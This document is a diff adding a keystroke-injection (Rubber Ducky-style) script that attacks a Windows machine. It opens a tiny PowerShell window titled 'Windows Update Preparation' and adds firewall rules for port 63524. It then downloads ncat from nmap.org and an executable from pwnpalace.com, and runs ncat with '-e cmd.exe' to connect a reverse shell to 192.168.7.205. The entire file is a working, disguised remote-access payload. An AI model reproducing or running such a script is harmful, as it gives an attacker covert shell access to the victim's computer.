@@ -1,0 +1,36 @@
+GUI R
+DELAY 500
+STRING PowerShell.exe -noe -c ". mode.com con: lines=1 cols=12"
+ENTER
+DELAY 500
+STRING netsh advfirewall firewall add rule name=z63524 dir=in action=allow protocol=TCP localport=63524; netsh advfirewall firewall add rule name=z63524 dir=out action=allow protocol=TCP localport=63524
+ENTER
+DELAY 300
+STRING $Host.UI.RawUI.WindowTitle = "Windows Update Preparation"
+DELAY 500
+ENTER
+DELAY 500
+STRING mkdir C:\Users\Public\Libraries\Library1
+ENTER
+DELAY 500
+STRING Invoke-WebRequest -Uri https://nmap.org/dist/nmap-7.80-win32.zip -Outfile C:\Users\Public\Libraries\Library1\nc.zip
+DELAY 500
+ENTER
+DELAY 500
+STRING Invoke-WebRequest -Uri http://pwnpalace.com/download/others/fce642c6-1963-4a0d-bffe-173f43f02329.zip -Outfile C:\Users\Public\Libraries\Library1\unzip.exe
+ENTER
+DELAY 500
+STRING cd C:\Users\Public\Libraries\Library1
+ENTER
+DELAY 500
+STRING .\unzip.exe nc.zip
+ENTER
+DELAY 750
+STRING cd nmap-7.80
+ENTER
+DELAY 500
+STRING .\ncat.exe 192.168.7.205 63524 -e cmd.exe
+DELAY 50
+ENTER
+DELAY 100
+WINDOWS DOWN
